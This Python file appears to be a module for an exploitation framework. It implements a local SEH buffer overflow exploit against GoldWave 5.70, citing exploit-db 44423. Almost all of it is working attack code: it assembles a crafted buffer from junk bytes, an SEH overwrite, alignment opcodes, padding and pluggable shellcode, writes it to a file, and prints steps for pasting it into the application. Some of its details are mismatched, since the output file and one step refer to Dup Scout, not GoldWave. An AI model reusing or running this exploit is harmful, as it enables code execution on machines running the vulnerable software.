from module_payload import PayloadModule


class BoomerModule(PayloadModule):
    def __init__(self):
        info = {"Name": "GoldWave 5.70 - Local Buffer Overflow",
                "Module Author": "Antonio Marcos",
                "Exploit Author": "bzyo",
                "Description": "GoldWave 5.70 - Local Buffer Overflow",
                "Reference": "https://www.exploit-db.com/exploits/44423/",
                "Arch": "X86"
                }
        options = {
            "file": ["File to dump payload", "files/output/dupscout.txt", False]
        }
        compatible = ["local/windows/x86/calc"]
        super(BoomerModule, self).__init__(options, info, compatible)

    def run(self):
        junk = "\x71" * 1019
        nseh = "\x61\x62"
        seh = "\x0f\x6d"
        valign = (
            "\x53"  # push ebx
            "\x47"  # align
            "\x58"  # pop eax
            "\x47"  # align
            "\x05\x16\x11"  # add eax,600
            "\x47"  # align
            "\x2d\x13\x11"  # sub eax,300
            "\x47"  # align
            "\x50"  # push eax
            "\x47"  # align
            "\xc3"  # retn
        )
        nops = "\x71" * 365
        fill = "\x71" * 5000

        if self.payload is None:
            self.print_info("put payload")
            return
        payload = self.payload.get_shellcode()
        buffer = junk + nseh + seh + valign + nops + payload + fill
        try:
            with open(self.options["file"][1], 'w') as textfile:
                textfile.write(buffer)
            self.print_ok(f'{self.options["file"][1]} generated')
            self.print_info("""1. Open Dup Scout
            2. open gold wave app
            3. select File, Open URL...
            4. paste contents from clipboard after 'http://'

            5. select OK""")
        except Exception as e:
            self.print_error(e)
